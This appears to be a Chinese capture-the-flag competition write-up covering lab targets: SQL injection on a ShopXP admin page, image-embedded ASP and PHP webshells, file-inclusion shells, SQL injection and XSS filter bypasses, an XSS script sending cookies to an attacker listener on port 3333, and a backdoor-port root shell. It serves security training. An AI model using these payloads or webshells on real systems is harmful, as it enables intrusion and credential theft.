访问网站/admin/pinglun.asp页面，此页面存在SQL注入漏洞，使用排序语句进行列数猜测，将语句作为Flag（形式：URL无空格）值提交。\n\n访问页面：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/mtzSS18CoFhM6T4j1710404866.png)\n\n发现姓名、标题、正文无法填写 修改html属性后点击保存\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/792JbqQuRwcfiufO1710404867.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/8J7e1WZJTZvX9Feg1710404867.png)\n\n保存后发现跳转带有id参数\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/S09nmLo6rZ1GbZ3Z1710404867.png)\n\n对id进行测试，发现当id为71、72这些数字时才回显页面内容（fuzz如下）\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/0aDB9I1uOz9eMKoO1710404867.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/3mxWPj2rVVLEOodp1710404868.png)\n\n当页面能回显时，我们就可以通过页面是否回显内容来判断SQL注入语句在数据库中的查询结果。\n\n构造 ```order by``` 来测试列数\n\n发现当order by 11时页面回显，12时页面不回显。说明数据库的列数为 **11**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/WL1firI8bZthqIgH1710404868.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/fi4sEYMZbgm8Erpu1710404868.png)\n\n```\nadmin/pinglun.asp?id=77 order by 11\n```\n\n这里没有标准答案，猜测是order by\n\n##### FLAG2: orderby\n\n#### 3.  页面没有返回任何有用信息，尝试使用联合查询进行SQL注入，构建基本查询语句进行SQL注入，将语句作为Flag（形式：语句无空格）值提交。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Ul19O0mrnXpPXmhm1710404868.png)\n\n因为这个网站是shopXP，而ShopXP的默认数据库名称叫做shopxp_admin，尝试对其进行测试。\n\n这里access数据库与mysql数据库不同的是，access的union select得查询一个表才能回显结果，而mysql只需要union select+数字测试。所以这里要知道数据库名\n\n```\nadmin/pinglun.asp?id=77 union select 1,2,3,4,5,6,7,8,9,10,11 from shopxp_admin\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/4oCjjNwR0s1u86TM1710404868.png)\n\n同样这里没有标准答案，猜测是union select\n\n##### FLAG3: unionselect\n\n#### 4.  使用联合查询进行列数猜测，构建常规的联合查询列数猜测语句，将出现在文本框里4个字段的序号作为Flag值（形式：F1.F2.F3.F4）提交。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/4oCjjNwR0s1u86TM1710404868.png)\n\n##### FLAG4: 3.5.6.10\n\n#### 5.  构建注入语句，查询数据库中管理员的敏感信息，将获取到密码信息作为Flag值（形式：Flag字符串）提交。\n\n服务端返回了第3、5、6、10个字段的结果。通过替换这四个位置的字段为数据库的字段，来达到任意数据读取的目的。\n\n这里猜测字段，一般用户名字段比如 **manager、user、username、name、admin** 密码字段比如 **password、passwd** 这些\n\n这里测试结果字段为 **admin;password**\n\n```\nadmin/pinglun.asp?id=77 union select 1,2,admin,4,password,6,7,8,9,10,11 from shopxp_admin\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/bDe3WZ86F9ODws8a1710404869.png)\n\n##### FLAG5: 7a57a5a743894a0e\n\n\n\n### SQL注入测试（shopxp+文件上传）\n\n任务环境说明：\n\n  服务器场景：Server12\n\n  服务器场景操作系统：未知（关闭链接）\n\n  字典文件：kali系统：/桌面/dictmd5.txt\n\n***磐云P10 P041-开源CMS实战渗透测试-ShopXp系统SQL注入** 原题\n\n#### 1.  已知靶机存在网站系统，使用Nmap工具扫描靶机端口，并将网站服务的端口号作为Flag值（格式：Flag字符串）提交。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/nUo5WBSdJwxoPhI51710404869.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/dyTRcNY7FUyjgSAk1710404869.png)\n\n##### FLAG1: 8089\n\n#### 2.  对靶机运行的网站系统进行扫描，并将后台登录页面的URL（不含host）作为Flag值提交。\n\n这里不用扫也可以，像/admin这种路径可以直接去尝试访问，一般都能直接访问到后台\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/TiXwj2Q8w2NJf8m81710404869.png)\n\n访问/admin，跳转了login.asp\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/xKCyWym1EBHjx8Ao1710404870.png)\n\n##### FLAG2: /admin/login.asp\n\n#### 3.  对靶机运行的网站系统进行渗透测试，将管理员的用户名和密码作为Flag值（格式：用户名/密码）提交。\n\n访问 /admin/pinglun.asp。该页面存在SQL注入漏洞\n\n传入?id=参数，当id为77时，存在评论回显：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/QrD4q6umoOAzhtko1710404870.png)\n\n```\n?id=77 order by 11 \n```\n\n当order by 为12时无回显\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/DC8tHIlyODw1iSzU1710404870.png)\n\n说明共有 **11** 个字段。\n\nshopXP的数据库为 **shopxp_admin** asp注入得有数据库才能查询得到\n\n```\n?id=1 union select 1,2,3,4,5,6,7,8,9,10,11 from shopxp_admin\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/YEsGzWFXQRgAPepi1710404870.png)\n\n猜测数据库的账号密码字段为 admin/password\n\n将字段 3 5 修改为猜测的字段：\n\n```\n?id=1 union select 1,2,admin,4,password,6,7,8,9,10,11 from shopxp_admin\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JOTQTX6Hi4D8XHTB1710404870.png)\n\n得到md5密码，md5反解得到密码为**admin**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Q5aSNGgqnczENBxN1710404870.png)\n\n实际上本身就是弱口令，猜测下就可以得到。这里是跟着设备的操作来，比较规范。\n\n##### FLAG3: admin/admin\n\n#### 4.  对靶机运行的网站系统进行渗透测试，将生成图片木马（使用提供的github.jpg以及webshell.asp，生成shell.jpg。）需要使用的命令作为Flag值提交。（系统：Windows7文件：/桌面/题目所需脚本/ShopXP系统SQL注入）\n\n这里的环境没有webshell.asp，写一个asp一句话木马：```<%eval request(\"cmd\") %>```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2TYRAL90ibEjdNBO1710404871.png)\n\n使用copy命令复制:\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/f1Rc5ZZtoWs7kdfA1710404871.png)\n\n##### FLAG4: copy github.jpg/b+webshell.asp/a shell.jpg\n\n#### 5.  对靶机运行的网站系统进行渗透测试，将靶机Web目录下的唯一一个gif文件名作为Flag值提交。\n\n访问后台目录：\n\n```\nhttp://10.140.98.241:8089/admin/login.asp\n```\n\n使用账号密码 admin/admin 登录\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/EVnIwMrf048lZVNT1710404871.png)\n\n\n\n成功登陆后，点击 **商城广告设置**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/r23m1nbWaaJFukll1710404871.png)\n\n该网页存在文件上传功能，此时上传我们制作好的jpg图片木马。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/zdaVvb4BHjFsHZZo1710404871.png)\n\n上传后得到图片的路径：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Aotqrbf25D0oVphY1710404872.png)\n\n访问该文件，发现图片不解析图像，而是解析数据。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/iFfhN508ykHHV3JJ1710404872.png)\n\n那就说明我们植入的一句话木马也会被解析，打开桌面的菜刀工具进行连接。\n\n添加SHELL 密码添加 cmd 类型选择 ASP\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/VQSIP0oRkyE09U5G1710404872.png)\n\n添加后连接，在网站根目录：```C:\\Inetpub\\wwwroot\\``` 找到了该gif文件\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/O3aVL1PS3F9ShFvl1710404872.png)\n\n##### FLAG5: pagerror\n\n\n\n\n\n### *Web渗透测试（文件上传+文件包含）\n\n任务环境说明：\n\t服务器场景：Server03\t\n\t服务器场景操作系统：未知（关闭连接）\n\n#### 1.  通过本地PC中的渗透测试平台Kali对靶机进行WEB渗透，找到页面内的文件上传漏洞并且尝试进行上传攻击，将文件上传成功后的页面回显字符串作为Flag提交（如：点击超链接查看上传文件）\n\n扫下服务，发现80和443端口，先访问http://网页\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Uthheg2Csvep8rp01710404872.png)\n\n这道题靶机与 **2022宜昌市任务书A B-1** 相同，但题目不同 这里先搞http的部分\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/qMdPre9TvDvKp2j71710404873.png)\n\n存在sql注入漏洞，将get传参后的url放入sqlmap跑\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/M6nujKP9PAxqercD1710404873.png)\n\n详细操作就不多赘述了，直接看结果\n\n```\nsqlmap -u \"http://192.168.31.124/index2.php?name=1&submit=%E6%9F%A5%E8%AF%A2\" -D webiu -T iuser --dump\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/eEGDL8mpXTi02DVU1710404874.png)\n\n我们得到了后台的用户密码。这时候我们再去访问靶机的https://服务\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/sN40NPVbCbemN8CJ1710404874.png)\n\n发现是一个登陆系统，这时候就可以用刚刚的账号密码进行登录了。\n\n```c++\nadmin 123321\n```\n\n登陆成功来到一个文件上传的页面：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/boFs2Xu23z1uvyv91710404875.png)\n\n要求只能上传 **jpg、png、jpeg** 文件，这里先随意上传一张图片看回显\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/UPzqxDr8ITHrR6FT1710404875.png)\n\n##### FLAG1: 文件上传成功, 点击预览\n\n#### 2.  通过本地PC中的渗透测试平台Kali对靶机进行WEB渗透，找到页面内的文件上传漏洞并且尝试进行上传攻击，使用相关的渗透测试手段，获取到WEB权限，使用WHOAMI获取WEB当前的用户权限，并作为Flag进行提交；\n\n上题我们已经上传文件了，此时点击预览跟进\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/THpMZdgqMI88MjeL1710404875.png)\n\n很明显是一个文件包含的页面，这里看源代码我们又能发现 这个包含的路径并不是我们的图片。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/o6n8EznjFNh0tn7s1710404875.png)\n\n是一个html标签，所以很可能我们包含的文件是一个php文件\n\n用伪协议来看下include.php的源代码\n\n```php\n?file=php://filter/convert.base64-encode/resource=include.php\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/dZvGZxyXHDSxgxHo1710404875.png)\n\n源码：\n\n```php\n<?php\nif (empty($_REQUEST['file'])) {\n    exit('非法访问');\n} else {\n    $path = $_REQUEST['file'];\n    if (file_exists(\"uploads/\" . $path . \".php\")) {\n        include \"uploads/\" . $path . \".php\";\n        echo $filecontent;\n    } else {\n        include $path;\n    }\n}\n```\n\n这里读取源码能发现：在传入file参数时，会去访问对应的php文件，如果存在则包含该php文件，反则包含file参数的文件。\n\n所以我们这里如果上传一个图片马，直接包含是利用不了的，因为**解析的不是图片 而是php代码生成的html标签**。\n\n因此我们要找到**图片的路径**，再去**包含这个图片路径**即可。\n\n注意这里如果用burpsuite抓包再放到repeater去可能会上传失败，猜测应该是token问题。\n\n##### **渗透操作：**\n\n1. 制作图片马\n\n\n```php\ntest.php:\n<?php eval($_POST['s']);?>\n```\n\ncopy制作：\n\n```\ncopy /b logo.png+test.php shell.png\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/FqBF8WGLr74ZeqJl1710404875.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/U6nHQSthIlx8YmTq1710404876.png)\n\n2. 上传图片马，找到图片路径\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/YuQrG6nTzHfkY1Ir1710404876.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/F312fHBYGhUj1qBP1710404876.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/DPMDedPVTM8IKhEm1710404876.png)\n\n3. 蚁剑连接\n\n蚁剑连接这个图片url即可，需要注意的是因为是https服务，所以要**忽略https证书**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/1zgnDLyxkZc1Fcht1710404877.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/5spD2ZOBbhi5WV5Z1710404877.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/1jaCRphpoWyk8Ld21710404877.png)\n\n连接成功，成功上线后这几题就好做了\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/YBKYkNSpagZjwV7H1710404877.png)\n\n##### FLAG2: apache\n\n#### 3.  通过本地PC中的渗透测试平台Kali对靶机进行WEB渗透，找到页面内的文件上传漏洞并且尝试进行上传攻击，使用相关的渗透测试手段，获取到WEB权限，使用相关指令获取到当前linux用户UID为5的用户，将该用户的用户名称作为Flag进行提交；\n\n```\ncat /etc/passwd | grep 5\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Ev82kqEaOMtyAbqO1710404877.png)\n\n##### FLAG3: sync\n\n#### 4.  通过本地PC中的渗透测试平台Kali对靶机进行WEB渗透，找到页面内的文件上传漏洞并且尝试进行上传攻击，使用相关的渗透测试手段，获取到WEB权限，使用相关指令查看后台首页文件，将该文件的第二行的所有字符串作为Flag进行提交；\n\n```\ncat index.php\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/h3ekCzKf94DRyhEM1710404877.png)\n\n##### FLAG4: session_start();\n\n\n\n### *网页渗透-21（CTF-Web）\n\n任务环境说明：\n\t服务器场景：Server21\n\t服务器场景操作系统：未知（封闭靶机）\n\t用户名:未知 密码：未知\n\n#### 1.  访问服务器网站目录1，根据页面信息完成条件，将获取到的flag提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/DnxRWLM9tA7uIbwz1710404877.png)\n\n判断了当前浏览器，说明是根据请求头的User-Agent来识别的。\n\n那么伪造一个不存在的浏览器标识，造成Error即可。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JoKliGAWUgappKCA1710404878.png)\n\n##### FLAG1: zTdKVpUKJu\n\n#### 2.  访问服务器网站目录2，根据页面信息完成条件，将获取到的flag提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/TRIKw9y2NQNfJbWU1710404878.png)\n\n识别访问IP，请求头分别是 ```X-Forwarded-For``` 或 ```Client-Ip```\n\n```\nX-Forwarded-For: 192.168.1.1\n// Client-Ip: 192.168.1.1\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/kLuhGBLPeMgHH9TT1710404878.png)\n\n##### FLAG2: 6i3zXHDPOx\n\n#### 3.  访问服务器网站目录3，根据页面信息完成条件，将获取到的flag提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/KGH6CRfaAPBXPsQ41710404878.png)\n\n选择一个数字 然后提交抓包：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/qzSxaPD5aYD3Mq8c1710404878.png)\n\n很可能是一个SQL注入，这边第一个比较简单 直接传入万能密码\n\n```mysql\nid=1' or 1=1 or '1\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Eiq2vcJQtRGbZBDn1710404879.png)\n\n##### FLAG3: 7Z9hwFpOlf\n\n#### 4.  访问服务器网站目录4，根据页面信息完成条件，将获取到的flag提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/uHtW1QaW0gyhtbud1710404879.png)\n\n同样的，sql题。这题过滤不一样\n\n因为上题是单引号，所以这题猜测可以是**双引号、单引号+括号、双引号+括号**\n\n尝试一番得知为 双引号+括号 的注入方式\n\n```mysql\nid=1\") or 1=1 #\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/M4sH4VX2J9om5PWa1710404879.png)\n\n##### FLAG4: YbR0BlQEVo\n\n#### 5.  访问服务器网站目录5，根据页面信息完成条件，将获取到的flag提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/oP81XIN94E94JIlb1710404879.png)\n\n注意这里变成了get传参。\n\n这里是将**or、and**这些关键词过滤了，过滤方式是替换为空，所以采用 **双写绕过** 可以fuzz一下字典得到。\n\n（但这里union、select没过滤，字段数是2，也可以直接得到）\n\n```mysql\n?id=1' oorr 1=1 %23\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/hK8rRubbiT3gimEH1710404879.png)\n\n##### FLAG5: rNPco4KBLN\n\n#### *6.  访问服务器网站目录6，根据页面信息完成条件，将获取到的flag提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/bFkQP5W7o392TJZF1710404879.png)\n\n这题过滤了单引号，通过前面的题了解该题的源码才做出来的。\n\n源码如下：\n\n```php\n<?php\nheader(\"Content-Type:text/html;charset=utf8\");\n$con=mysqli_connect(\"localhost\",\"root\",\"123456\",\"hello\");\n\nif(!$con){\n        echo \"Connect failed : \".mysqli_connect_error();\n}\n\n$id=$_GET['id'];\n\n$id=str_replace(\"'\",\"'/\",$id);\n\n$sql=\"select * from user where id='$id'\";\n$result=mysqli_query($con,$sql);\n\nif(!$result){\n                exit(\"\");\n                }else{\n        $num=mysqli_num_rows($result);\n        }\n        if($num!=0){\n                echo \"flag:C9K8TVwf7Z\";\n}\n        mysqli_close($con);\n\n\n?>\n```\n\n关键是 \n\n```php\n$id=str_replace(\"'\",\"'/\",$id);\n```\n\n将 ```'```转义成 ```'/``` 所以绕过要想办法将**斜杠**绕过去\n\n这里想到可以构造 ```/**/``` 注释刚好来**绕过空格，又能绕过斜杠**\n\n所以最终payload就是\n\n```mysql\n1'**/ or 1=1 %23\n// 1'**/ union select 1,2 %23\n```\n\n传入到数据库的形式是这样：\n\n```mysql\nselect * from user where id='$id';\n($id: 1'/**/ or 1=1 %23)\n\t↓\nselect * from user where id='1'/**/ or 1=1 #';\n\t↓\nselect * from user where id='1'/**/ or 1=1;\n利用反斜杠构造注释符 同时制造了空格。\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/TVHMZQ1FdCOozHHa1710404880.png)\n\n如果没拿到源码看过滤 恐怕做不出来。因为sqlmap的level 5 都没有跑出来。\n\n##### FLAG6: C9K8TVwf7Z\n\n\n\n#### *非预期解\n\n3-6题的sql题非预期可以通过sqlmap来查询库中的id来做。\n\n因为源码运行逻辑都是根据**查询是否正确**来回显flag，如果id是库中存在的id就可以跑出flag。\n\n或者你可以尝试爆破id。\n\n从最薄弱的第3题注入点入手，可以直接爆出数据库内容，由于是盲注 所以时间会比较慢。\n\n```mysql\nsqlmap -u 'http://192.168.31.117/3/index.php' --data \"id=1\" --batch -D hello --tables --dump\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/VPU7zI8zDSxR1Neh1710404880.png)\n\n将id带入到每一题中即可获得FLAG。\n\n### 跨站脚本攻击（JS-xss）\n\n任务环境说明：\n\n√ 服务器场景：Server2125（关闭链接）\n\n√ 服务器场景操作系统：未知\n\n√ 用户名:未知 密码：未知\n\n#### 1.  访问服务器网站目录1，根据页面信息完成条件，将获取到弹框信息作为flag提交；\n\n```\nhttp://192.168.31.227/1/index.php\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JkQZGRrEsiX77jcv1710404880.png)\n\n传参 ```?name``` 要求构造XSS语句，如果成功实现alert即可得到FLAG\n\n第一题很简单：\n\n```\nPayload: ?name=<script>alert(1)</script>\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/A2TipMZ2WXlXufbL1710404880.png)\n\n审计下前端js源码，其实就是调用一个 **md5.js** 然后用 **b64_md5** 方法加密传入的字符串 最后跳窗显示加密后的字符串。\n\n```html\n<!DOCTYPE html><!--STATUS OK--><html>\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\">\n<script src='md5.js'></script>\n<script>\n\nwindow.alert = function()  \n{ \nvar x = b64_md5('good job');\nvar x = confirm(x); \n}\n</script>\n</head>\n<body>\n<h1>请使用1注入</h1>\n<h2>welcome name：<script>alert(1)</script></h2></body>\n</html>\n```\n\n所以你可以用控制台把 **b64_md5(xxxx)** 的值打印出来，也可以用 **alert()** 直接符合条件得到FLAG\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/gcuzkt4sbhFKWuYL1710404880.png)\n\n##### FLAG1: luKOh/C9obMtoJUtHD37Zg\n\n#### 2.  访问服务器网站目录2，根据页面信息完成条件，将获取到弹框信息作为flag提交；\n\n第二题，输入输入框然后搜索。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/oYQIPMFVy5EzXyS21710404881.png)\n\n我们输入的部分到了标签这里，绕过标签属性限制并实现xss。\n\n```\nPayload: index.php?keyword=1\"><script>alert(1)</script>&submit=搜索\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/3aj39pEvvU2i0YtT1710404881.png)\n\n##### FLAG2: 199bZN8Rge8dYtZGoTqoYA\n\n\n\n#### 3.  访问服务器网站目录3，根据页面信息完成条件，将获取到弹框信息作为flag提交；\n\n短标签被过滤，不解析。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/E1nU17enM5bJAopX1710404881.png)\n\n考虑利用input的属性标签弹窗。\n\n```\nPayload: index.php?keyword=123' onclick='alert(1)'&submit=搜索\n```\n\n点击input输入框得到FLAG\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/LlR4G2FzcjGrj2jC1710404881.png)\n\n##### FLAG3: wO+8fB5yu3KCdNq5V7Uo5g\n\n#### 4. 访问服务器网站目录4，根据页面信息完成条件，将获取到弹框信息作为flag提交；\n\n第四题单引号改为双引号即可。\n\n```\nPayload: index.php?keyword=123\" onclick='alert(1)'&submit=搜索\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/OBTFn22W1mTkz4hj1710404881.png)\n\n##### FLAG4: 0XRMADSrrZh7Ptv1VS9/zw\n\n#### 5. 访问服务器网站目录5，根据页面信息完成条件，将获取到弹框信息作为flag提交；\n\n第五题一律转换为小写+黑名单过滤，**on \\<script>** 被过滤\n\n用**href+javascript**伪协议绕过\n\n```\nPayload: index.php?keyword=123\"><a href=\"javascript:alert(1);\">xss</a>&submit=搜索\\\n```\n\n点击超链接得到FLAG\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/TLdaN0vlqaMeCcjs1710404882.png)\n\n##### FLAG5: Si3Czm1JYclcYp4KklGM3A\n\n#### 6.  访问服务器网站目录6，根据页面信息完成条件，将获取到弹框信息作为flag提交；\n\n同样和第五题一样黑名单过滤，更严格 还过滤了 href\n\n由于第六题没有把小写转换成大写 所以可以用大写绕过。\n\n```\nPayload: index.php?keyword=123\" ONclick=alert(1)>&submit=搜索\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/qDhpZYtiiykAbBYE1710404882.png)\n\n##### FLAG6: Mki8dUfOl7Khl7KgbPcoPQ\n\n### *代码审计（xss反弹cookie）\n\n**任务环境说明：**\n\nü 服务器场景：PYsystem002\n\nü 服务器场景操作系统：未知（显示链接）\n\nü 服务器用户名:未知 密码：未知\n\n#### 1.  在渗透机Kali Linux中访问靶机服务器Web页面，注册账号并登陆，找到存在XSS执行漏洞的页面，将该页面中存在XSS执行漏洞的对象名作为FLAG提交；\n\n打开首页，注册账号，登录；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Xsy7ToiSSHTNF20m1710404882.png)\n\n进入到个人中心\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/q1geEI76huLVPovF1710404882.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2qlz4ijd2zz4D6UN1710404882.png)\n\n一般修改的都是用户名，或者其它信息，因为这样修改过后 后台管理员在审批用户时会先看到你的名字，如果用户名是一串xss代码 那么就实现了盗取管理员cookie的操作。\n\n所以这里的对象名是username\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/LWzo70wkZvrsymm71710404883.png)\n\n##### FLAG1: username\n\n\n\n#### 2.  构造Cookie反弹JS脚本，将该JS代码中使用的对象及方法作为FLAG（形式：对象.方法）进行提交；\n\n首先要修改用户名就得在注册处修改，插入xss代码，所以得重新注册一个账号。\n\n至于恶意代码我们需要实现反弹cookie的操作，结合下面的题目要求**大致思路**是：\n\n**1.使用攻击机Kali挂起端口**\n\n**2.xss写入js代码，获取当前用户的cookie并实现强制跳转的操作**\n\n**3.管理员访问构造好的攻击机的ip+端口+cookie的恶意url，成功反弹。**\n\n所以这里的xss代码大致是这样：\n\n```javascript\n<script>document.write(\"<script>window.location.href='http://172.16.101.2:3333/\"+document.cookie+\"'</script>\")</script>\n```\n\n利用 **document.write** 写入html标签，标签内容为javascript代码，利用 **window.location.href=url+cookie** 来构造恶意URL，将cookie传输至我们的靶机。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/SoAMBJoDqwAGDMUY1710404883.png)\n\n理论上是这样子的。\n\n但是由于有长度限制和一些过滤，这个payload不会那么顺利的插入\n\n##### FLAG2: document.write\n\n#### 3.  在渗透机Kali Linux中重启Web服务，将重启使用的命令作为FLAG进行提交；\n\n重启apache2服务\n\n```\nservice apache2 restart\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/M1mQ3d3WKKxZSVyO1710404883.png)\n\n##### FLAG3: service apache2 restart\n\n#### 4.  在靶机服务器中利用原有的XSS漏洞调用上述JS脚本，在渗透机Kali Linux中开启3333端口监听，将开启端口监听使用的命令作为FLAG提交；\n\n使用nc命令监听：\n\n```\nnc -lvvp 3333\n```\n\n一般来说我们常用的监听是这样子的，但是答案的话每个参数都得写清楚。\n\n##### FLAG4: nc -l -p 3333\n\n#### 5.  在渗透机Kali Linux中开启3333端口监听，将开启端口监听后接收回应的第一行的第一个单词作为FLAG提交；\n\n攻击机：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/3R2qaZL1rhqYzuLE1710404883.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/XNwfgaMNrSX7nCZ11710404883.png)\n\n恶意用户：\n\n由于服务器对数据长度都做了限制，所以这里尽可能地模拟了反弹cookie的url。\n\n```html\nPoc: <img src='http://172.16.101.2:3333'>\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ECBugztl4XcEMCYf1710404883.png)\n\n客户端：\n\n使用 **admin;admin** 登录后台账户。\n\n点击 **用户管理**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/sc4sfhPXRYWh5Ii61710404884.png)![](http://cdn.anyiblog.top/WriteUp/20240314/tDurrpy4WDX9Nfdp1710404884.png)\n\n可以看到成功访问了我们构造的url，此时打开攻击机查看返回的结果：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/7gAkrzqYq8KaWL601710404884.png)\n\n##### FLAG5: GET\n\n#### 6.  在渗透机Kali Linux中开启3333端口监听，将开启端口监听后接收回应的第五行的最后一个单词作为FLAG提交。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/tQzXuqZ4Uy7m8slD1710404884.png)\n\n##### FLAG6: deflate\n\n\n\n## 渗透测试题\n\n### Linux操作系统渗透测试（弱口令+后门端口）\n\n任务环境说明：\n\t服务器场景：Linux2020\n\t服务器场景操作系统：Linux（版本不详）（关闭链接）\n\n#### 靶机漏洞总结：\n\n**共4个漏洞**\n\n- 4个弱口令用户\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/upwYEoWWs1IkfCkU1710404884.png)\n\n- 48117后门端口\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ZiIdSE447Nl44v9T1710404885.png)\n\n- root用户弱口令\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/kmdvMAueD0Fagmpd1710404885.png)\n\n- mysql-root用户弱口令\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/yB5OFoYurtxiEHZb1710404885.png)\n\n\n\n#### 1.  通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行系统服务及版本扫描渗透测试，并将该操作显示结果中21端口对应的服务版本信息字符串作为Flag值提交；\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/XWVCCZznfi44yfr61710404885.png)\n\n##### FLAG1: vsftpd 2.3.4\n\n#### 2.  通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/var/www目录中唯一一个后缀为.bmp文件的文件名称作为Flag值提交；\n\n用TCP同步扫描和全端口扫描靶机，能发现48117后门端口\n\n ```\nnmap -Pn -sS -p- 192.168.31.147\n ```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ZiIdSE447Nl44v9T1710404885.png)\n\n```\nnc 192.168.31.147 48119\n```\n\n直接nc就有shell了且为root权限，后面的题就都能做了。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/YnlcTOMuD0Va5ttd1710404885.png)\n\n##### FLAG2: wuslwczr\n\n#### 3.  通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/var/www目录中唯一一个后缀为.bmp的图片文件中的英文单词作为Flag值提交；\n\n 将图片cp到/var/www/html网页路径下，再给文件高权限，此时我们去访问靶机对应的文件名称就可以直接得到文件内容了。\n\n```\ncp /var/www/wuslwczr.bmp /var/www/html/wuslwczr.bmp\nchmod 777 -R /var/www/html\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/9TtExRND28oyOJUk1710404886.png)\n\n##### FLAG3: gutldhan\n\n#### 4.  通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/var/vsftpd目录中唯一一个后缀为.docx文件的文件名称作为Flag值提交；\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/mwsMipEz9RDULiGe1710404886.png)\n\n##### FLAG4: bmqfldne\n\n#### 5.  通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/var/vsftpd目录中唯一一个后缀为.docx文件的文件内容作为Flag值提交；\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/XXqx31U1AkzZpity1710404886.png)\n\n##### FLAG5: tywajsfk\n\n#### 6.  